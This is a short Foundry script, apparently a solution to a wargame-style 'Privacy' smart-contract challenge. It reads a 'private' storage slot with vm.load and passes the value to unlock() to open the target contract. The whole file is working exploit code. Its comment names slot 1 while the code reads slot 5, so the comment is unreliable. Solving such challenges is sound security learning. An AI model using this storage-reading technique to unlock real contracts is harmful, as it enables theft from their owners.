// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";             


contract PrivacyScript is Script {

    Privacy internal privacy;

    constructor() {
        privacy = Privacy(vm.envAddress("PRIVACY_INSTANCE"));
    }

    function run() public {
        uint256 pk = vm.envUint("PK");
        bytes16 key = bytes16(vm.load(address(privacy), bytes32(uint256(5)))); // passwsord is stored at slot 1

        vm.startBroadcast(pk);
        privacy.unlock(key);
        vm.stopBroadcast();
    }

    // forge script script/privacy.s.sol:PrivacyScript --broadcast
}

contract privacyExecutor {
    Privacy internal _privacy;

    constructor(Privacy privacy) {
        _privacy = privacy;
    }
}

